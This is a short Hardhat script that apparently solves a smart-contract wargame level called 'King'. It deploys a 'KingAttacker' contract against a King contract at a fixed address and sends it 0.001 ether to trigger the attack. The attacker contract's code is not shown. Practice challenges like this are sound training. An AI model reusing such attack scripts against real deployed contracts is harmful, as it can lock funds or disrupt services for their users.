import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const king = await ethers.getContractAt("King", "0x2ba9aA3814F211e70C54E7b4c344B316BF08BB74");

  const KingAttacker = await ethers.getContractFactory("KingAttacker");
  const kingAttacker = await KingAttacker.deploy(king.address);
  console.log("attacker deployed at", kingAttacker.address);

  const tx = await signer.sendTransaction({ to: kingAttacker.address, value: ethers.utils.parseEther("0.001") });
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
